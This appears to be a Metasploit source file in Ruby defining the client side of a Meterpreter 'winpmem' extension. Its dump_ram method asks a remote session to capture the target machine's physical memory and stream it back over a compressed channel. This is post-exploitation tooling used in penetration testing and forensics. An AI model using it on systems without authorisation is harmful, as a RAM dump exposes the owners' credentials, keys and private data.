# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/winpmem/tlv'

module Rex
module Post
module Meterpreter
module Extensions
module Winpmem
###
#
# This meterpreter extension can be used to capture remote RAM
#
###
class Winpmem < Extension
  WINPMEM_ERROR_SUCCESS = 0
  WINPMEM_ERROR_FAILED_LOAD_DRIVER = 1
  WINPMEM_ERROR_FAILED_MEMORY_GEOMETRY = 2
  WINPMEM_ERROR_FAILED_ALLOCATE_MEMORY = 3
  WINPMEM_ERROR_FAILED_METERPRETER_CHANNEL = 4
  WINPMEM_ERROR_UNKNOWN = 255

  def initialize(client)
    super(client, 'winpmem')

    client.register_extension_aliases(
      [
        {
          'name' => 'winpmem',
          'ext'  => self
        },
      ])
  end

  def dump_ram
    request = Packet.create_request('dump_ram')
    response = client.send_request(request)
    response_code = response.get_tlv_value(TLV_TYPE_WINPMEM_ERROR_CODE)

    return 0, response_code, nil if response_code != WINPMEM_ERROR_SUCCESS

    memory_size = response.get_tlv_value(TLV_TYPE_WINPMEM_MEMORY_SIZE)
    channel_id = response.get_tlv_value(TLV_TYPE_CHANNEL_ID)

    raise Exception, "We did not get a channel back!" if channel_id.nil?

    # Open the compressed Channel
    channel = Rex::Post::Meterpreter::Channels::Pool.new(client, channel_id, "winpmem",
      CHANNEL_FLAG_SYNCHRONOUS | CHANNEL_FLAG_COMPRESS)
    return memory_size, response_code, channel
  end
end
end; end; end; end; end
